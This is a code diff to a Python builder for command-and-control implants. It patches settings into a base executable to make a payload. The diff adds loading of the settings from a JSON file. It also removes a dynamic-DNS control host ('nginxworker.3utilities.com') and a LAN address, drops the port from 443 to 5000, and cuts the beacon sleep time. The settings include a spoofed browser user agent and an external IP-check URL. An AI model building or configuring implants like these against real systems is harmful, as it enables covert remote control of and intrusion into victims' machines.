@@ -11,17 +11,20 @@ Future plans: UI of some sort, encrypting the config file
 """
 
 class configuration:
-    def __init__(self, version=1, verbose=False, buffer_length=2000):
+    def __init__(self, version=1, verbose=False, buffer_length=2000, path=None):
         self.buffer_length = buffer_length
 
-        self.config = dict()
+        if path == None:
+            self.config = dict()
+            self.config["strings"] = dict()
+            self.config["endpoints"] = dict()
+        else:
+            f = open(path)
+            self.config = json.load(f)
         self.version = version
         self.verbose = verbose
 
         self.config["version"] = self.version
-        self.config["strings"] = dict()
-        self.config["endpoints"] = dict()
-
         self.strings = self.config["strings"]
         self.endpoints = self.config["endpoints"]
 
@@ -86,15 +89,13 @@ class configuration:
 
         # net
         self.config["hostname"] = "127.0.0.1"
-        self.config["hostname"] = "192.168.15.75"
-        self.config["hostname"] = "nginxworker.3utilities.com"
-        self.config["port"] = 443
+        self.config["port"] = 5000
         self.config["protocol"] = "http"
         self.config["useragent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36"
         self.config["ipcheckurl"] = "http://ifconfig.me/ip"
 
         # times
-        self.config["sleeptime"] = 17 * 1000
+        self.config["sleeptime"] = 1 * 1000
         self.config["cmdtimeout"] = 30 * 10000000
 
         # keys
@@ -132,6 +133,7 @@ def main():
     parser = argparse.ArgumentParser(description="Basic builder utility for implants as seen at https://www.youtube.com/watch?v=FiT7-zxQGbo")
     parser.add_argument('--i', type=str, default='base.exe', help="Input file")
     parser.add_argument('--o', type=str, default='out.exe', help="Output file")
+    parser.add_argument('--c', type=str, default=None, help="Configuration file")
     parser.add_argument('--v', default=False, action='store_true', help="Verbose output")
     parser.add_argument('--dry-run', default=False, action='store_true', help="Dry run (don't write output file)")
 
@@ -141,8 +143,18 @@ def main():
     verbose = args.v
     dry_run = args.dry_run
 
-    config = configuration(version=1, verbose=verbose, buffer_length=BUFLEN)
-    config.assign_default_values()
+    if args.c != None:
+        if verbose:
+            print("Reading config from " + args.c)
+        config = configuration(version=1, verbose=verbose, buffer_length=BUFLEN, path=args.c)
+    else:
+        if verbose:
+            print("No config given. Generating default config...")
+        config = configuration(version=1, verbose=verbose, buffer_length=BUFLEN)
+        config.assign_default_values()
+        # f = open("default.json", "w+")
+        # json.dump(config.config, f)
+    
     gen_payload(config, infile, outfile, dry_run=dry_run)
     
 
